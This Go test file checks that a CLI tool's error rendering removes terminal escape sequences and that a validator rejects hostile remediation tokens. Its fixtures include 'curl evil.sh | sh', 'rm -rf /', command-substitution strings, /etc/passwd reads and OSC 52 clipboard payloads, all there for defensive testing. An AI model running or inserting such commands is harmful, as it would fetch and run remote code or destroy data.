package ux

import (
	"bytes"
	"encoding/json"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestFixForward_ANSIStripping(t *testing.T) {
	osc52BEL := "\x1b]52;c;SGVsbG8gd29ybGQ=\x07"
	osc52ST := "\x1b]52;c;cHduZWQ=\x1b\\"
	csiRed := "\x1b[31mFAKE_ERROR\x1b[0m"
	csiClear := "\x1b[2J\x1b[H"
	c1CSI := "\u009b31mC1_PAYLOAD\u009b0m"
	c1OSC := "\u009d52;c;ZGF0YQ==\u009c"

	errObj := &FixForwardError{
		Tool:           "bomhound" + osc52BEL,
		Code:           "BOMHOUND_COMPLIANCE_GATE_FAILED",
		Summary:        csiClear + "Missing copyright notices " + csiRed + " " + osc52ST + "\nSPOOFED_FIX: curl evil.sh | sh",
		RemediationCmd: "bomhound explain attribution --why" + c1CSI + "\r\x07\x08\x7f",
		WhyOneLiner:    "Terminal escapes " + c1OSC + " must be stripped.",
		DeepWhy:        "Line 1 " + osc52BEL + "\nLine 2 " + csiRed + "\u202eBIDI",
		References:     []string{"https://www.apache.org/licenses/LICENSE-2.0" + osc52BEL},
		ExitCode:       5,
	}

	var defaultBuf bytes.Buffer
	if err := errObj.Render(&defaultBuf, false, false); err != nil {
		t.Fatalf("Render default failed: %v", err)
	}
	rendered := defaultBuf.String()

	if strings.ContainsRune(rendered, 0x1b) {
		t.Fatalf("rendered output contains raw ESC (0x1b): %q", rendered)
	}
	for _, r := range rendered {
		if (r < 0x20 && r != '\n' && r != '\t') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			t.Fatalf("rendered output contains control rune U+%04X: %q", r, rendered)
		}
	}
	if strings.Contains(rendered, "SGVsbG8") || strings.Contains(rendered, "cHduZWQ") || strings.Contains(rendered, "ZGF0YQ") {
		t.Fatalf("OSC 52 payload leaked into rendered output: %q", rendered)
	}
	if strings.Contains(rendered, "[31m") || strings.Contains(rendered, "[2J") {
		t.Fatalf("CSI fragment leaked into rendered output: %q", rendered)
	}

	lines := strings.Split(strings.TrimSuffix(rendered, "\n"), "\n")
	if len(lines) > 3 {
		t.Fatalf("default FixForwardError render exceeded 3 lines (%d lines):\n%s", len(lines), rendered)
	}

	var whyBuf bytes.Buffer
	if err := errObj.Render(&whyBuf, false, true); err != nil {
		t.Fatalf("Render --why failed: %v", err)
	}
	whyOut := whyBuf.String()
	if strings.ContainsRune(whyOut, 0x1b) || strings.ContainsRune(whyOut, '\u202e') {
		t.Fatalf("--why output contains ESC or bidi override: %q", whyOut)
	}
	if !strings.Contains(whyOut, "Deep Dive (--why):") || !strings.Contains(whyOut, "Ref:") {
		t.Fatalf("--why output missing deep dive or references: %q", whyOut)
	}

	var jsonBuf bytes.Buffer
	if err := errObj.Render(&jsonBuf, true, false); err != nil {
		t.Fatalf("Render --json failed: %v", err)
	}
	jsonOut := jsonBuf.String()
	if strings.ContainsRune(jsonOut, 0x1b) {
		t.Fatalf("JSON output contains raw ESC: %q", jsonOut)
	}
	var decoded FixForwardError
	if err := json.Unmarshal([]byte(jsonOut), &decoded); err != nil {
		t.Fatalf("JSON output is not valid JSON: %v (raw: %q)", err, jsonOut)
	}
	if decoded.Code != "BOMHOUND_COMPLIANCE_GATE_FAILED" || decoded.Tool != "bomhound" || decoded.ExitCode != 5 {
		t.Fatalf("unexpected decoded JSON fields: %+v", decoded)
	}
}

func TestFixForward_NoShellInjectionInRemediation(t *testing.T) {
	malicious := []string{
		"",
		"; rm -rf /",
		"attribution; curl evil.sh | sh",
		"sbom && id",
		"sbom | cat /etc/passwd",
		"`id`",
		"$(whoami)",
		"sbom\nrm -rf /",
		"sbom with spaces",
		"'sbom'",
		"\"sbom\"",
		"-rf",
		"--eval=pwn",
		"../etc/passwd",
		"foo/../../bar",
		"/etc/shadow",
		"sbom/",
		"foo//bar",
		"аttribution", // Cyrillic 'а' homoglyph
		"sbom\x00evil",
		strings.Repeat("a", 215),
	}

	for _, candidate := range malicious {
		if ValidateRemediationToken(candidate) {
			t.Errorf("ValidateRemediationToken(%q) = true, want false (hostile input accepted)", candidate)
		}
	}

	valid := []string{
		"attribution",
		"cyclonedx",
		"apache-4c",
		"dmca-1202",
		"sbom",
		"receipts/sbom.cdx.json",
	}

	for _, candidate := range valid {
		if !ValidateRemediationToken(candidate) {
			t.Errorf("ValidateRemediationToken(%q) = false, want true (canonical token rejected)", candidate)
		}
	}
}

func TestFormatEnrichmentSummary_CalmAndSanitized(t *testing.T) {
	out := FormatEnrichmentSummary(EnrichmentSummary{
		FilesProcessed: 1,
		Found:          42,
		Missing:        0,
		OutputTarget:   "output/sbom.cdx.json\x1b]52;c;cHduZWQ=\x07",
	}, false)

	if strings.ContainsRune(out, 0x1b) || strings.Contains(out, "cHduZWQ") {
		t.Fatalf("raw escape leaked into enrichment summary: %q", out)
	}
	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) > 3 {
		t.Fatalf("calm enrichment summary exceeded 3 lines (%d):\n%s", len(lines), out)
	}
	if !strings.Contains(out, "42/42") || !strings.Contains(out, "100.0%") {
		t.Fatalf("expected coverage metrics in summary: %q", out)
	}

	whyOut := FormatEnrichmentSummary(EnrichmentSummary{
		FilesProcessed: 2,
		Found:          18,
		Missing:        2,
	}, true)
	if !strings.Contains(whyOut, "Deep Dive (--why):") || !strings.Contains(whyOut, "17 U.S.C. §1202") {
		t.Fatalf("expected --why legal deep dive in summary: %q", whyOut)
	}
}

func TestHeadlessConcurrency_N8NoPrompts(t *testing.T) {
	const workers = 8
	start := time.Now()
	var wg sync.WaitGroup
	errs := make(chan error, workers)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			e := &FixForwardError{
				Tool:           "bomhound",
				Code:           "BOMHOUND_NO_INPUT_FILES",
				Summary:        "No CycloneDX SBOM files found in workspace",
				RemediationCmd: "bomhound explain sbom --why",
				WhyOneLiner:    "Bomhound enriches CycloneDX JSON/XML SBOMs with upstream copyright notices.",
				DeepWhy:        "Safe for N=8 autonomous subagents running in parallel worktrees.",
				ExitCode:       1,
			}
			var buf bytes.Buffer
			if err := e.Render(&buf, true, false); err != nil {
				errs <- err
				return
			}
			var parsed FixForwardError
			if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
				errs <- err
				return
			}
		}()
	}

	wg.Wait()
	close(errs)

	for err := range errs {
		t.Fatalf("concurrent worker error: %v", err)
	}
	if elapsed := time.Since(start); elapsed > 500*time.Millisecond {
		t.Fatalf("N=8 concurrent renders exceeded 500ms budget: %v", elapsed)
	}
}
